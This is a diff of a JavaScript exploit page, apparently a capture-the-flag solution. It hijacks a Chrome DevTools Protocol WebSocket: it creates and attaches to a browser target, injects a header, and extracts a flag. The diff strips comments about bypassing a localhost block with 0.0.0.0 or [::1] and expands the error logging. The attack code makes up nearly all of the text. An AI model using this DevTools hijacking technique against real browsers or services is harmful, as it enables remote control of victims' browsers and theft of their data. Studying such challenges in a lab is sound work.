@@ -15,11 +15,6 @@ function run() {
     var path = document.getElementById("path").value;
     var host = document.getElementById("host").value;
     
-    // THE BYPASS: Use 0.0.0.0 to satisfy "IP" check but bypass "127.0.0.1" block
-
-    // If 0.0.0.0 fails, un-comment the next line to try IPv6:
-    // host = "[::1]";
-    
     var url = "ws://" + host + ":" + port + path;
     
     log("Connecting to: " + url);
@@ -29,21 +24,18 @@ function run() {
         
         ws.onopen = function() {
             log("<b>[+] Connected! Hijacking...</b>");
-            // 1. Create Target
             ws.send(JSON.stringify({id: 1, method: "Target.createTarget", params: {url: "about:blank"}}));
         };
 
         ws.onmessage = function(e) {
             var msg = JSON.parse(e.data);
             
-            // 2. Attach
             if(msg.id === 1) {
                 var targetId = msg.result.targetId;
                 log("[+] Target Created. Attaching...");
                 ws.send(JSON.stringify({id: 2, method: "Target.attachToTarget", params: {targetId: targetId, flatten: true}}));
             }
             
-            // 3. Inject
             if(msg.id === 2) {
                 var sid = msg.result.sessionId;
                 log("[+] Session Acquired ("+sid+"). Injecting header...");
@@ -69,15 +61,17 @@ function run() {
                 }, 1500);
             }
             
-            // 4. Flag
             if(msg.id === 6) {
                 log("<h1 style=color:red;font-size:30px;border:2px solid red>FLAG: " + msg.result.result.value + "</h1>");
             }
         };
         
         ws.onerror = function(e) {
-            log("<b style=color:red>[-] Connection Failed.</b><br>Try changing 0.0.0.0 to [::1] in the code?");
+            log("<b style=color:red>[-] WebSocket Error:</b><br>" + 
+                "Error: " + JSON.stringify(e) + "<br>");
         };
-    } catch(e) { log("Error: " + e); }
+    } catch(e) { 
+        log("<b style=color:red>[-] Setup Error:</b><br>" + e.toString() + "<br>Stack: " + (e.stack || "N/A"));
+    }
 }
 </script>
